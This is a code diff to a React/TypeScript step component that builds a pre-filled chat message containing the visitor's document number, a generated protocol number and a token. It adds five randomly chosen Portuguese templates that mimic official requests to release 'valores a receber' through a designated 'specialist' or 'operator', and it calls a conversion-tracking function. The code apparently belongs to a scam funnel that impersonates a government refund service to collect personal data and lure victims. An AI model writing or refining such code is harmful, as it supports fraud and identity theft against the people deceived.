@@ -87,16 +87,51 @@ export function Step2({ data, onReset }: Step2Props) {
     // UTF-8 safe base64 encoding for the token
     const token = btoa(unescape(encodeURIComponent(data.docValue))).substring(0, 12).toUpperCase();
 
-    const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
-    const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
+    const messages = [
+      `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*\n\n` +
+      `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
       `*DETALHES DA SOLICITAÇÃO:* \n` +
       `• Protocolo: *#${protocol}*\n` +
       `• Token de Validação: *${token}*\n` +
       `• Tipo de Documento: *${data.docType}*\n` +
       `• Documento Identificado: *${data.docValue}*\n\n` +
-      `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;
+      `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`,
 
-    const message = encodeURIComponent(header + "\n\n" + body);
+      `*AUTENTICAÇÃO E LIBERAÇÃO - VALORES DISPONÍVEIS*\n\n` +
+      `Olá, gostaria de iniciar o atendimento para resgate dos meus valores pendentes no sistema. Aqui estão as informações do meu protocolo:\n\n` +
+      `*DADOS DE CONTROLE:*\n` +
+      `- ID de Atendimento: *#${protocol}*\n` +
+      `- Código de Segurança: *${token}*\n` +
+      `- Cadastro: *${data.docType}* - *${data.docValue}*\n\n` +
+      `Poderia me orientar sobre os próximos passos para o recebimento?`,
+
+      `*SISTEMA DE VALORES A RECEBER — FORMULÁRIO DE PEDIDO*\n\n` +
+      `Ao Departamento Jurídico-Financeiro, solicito a homologação e liberação dos meus saldos registrados no sistema.\n\n` +
+      `*INFORMAÇÕES DO REQUERENTE:*\n` +
+      `• Protocolo Gerado: *#${protocol}*\n` +
+      `• Chave de Validação: *${token}*\n` +
+      `• Tipo de Cadastro: *${data.docType}*\n` +
+      `• Registro: *${data.docValue}*\n\n` +
+      `Fico no aguardo do contato com o operador designado para finalizar a transferência.`,
+
+      `*REQUISIÇÃO DE ATIVOS - PORTAL DE VALORES*\n\n` +
+      `Quero realizar o saque do meu saldo disponível. Seguem os dados para localização do meu registro:\n\n` +
+      `• Código Protocolo: *#${protocol}*\n` +
+      `• Chave Token: *${token}*\n` +
+      `• Cadastro Documento: *${data.docType} (${data.docValue})*\n\n` +
+      `Favor prosseguir com a liberação dos valores na minha chave cadastrada.`,
+
+      `*SVR - CANAL DE ATENDIMENTO DE ATIVOS*\n\n` +
+      `Olá, acabei de realizar a consulta e gostaria de concluir a transferência dos valores para minha conta bancária.\n\n` +
+      `*DADOS DO MEU PROTOCOLO:*\n` +
+      `• Identificador: *#${protocol}*\n` +
+      `• Token de Segurança: *${token}*\n` +
+      `• Documento do Titular: *${data.docType} ${data.docValue}*\n\n` +
+      `Por favor, me informe como proceder para receber o comprovante e concluir o resgate.`
+    ];
+
+    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+    const message = encodeURIComponent(randomMsg);
 
     const notifyConversion = async () => {
       try {
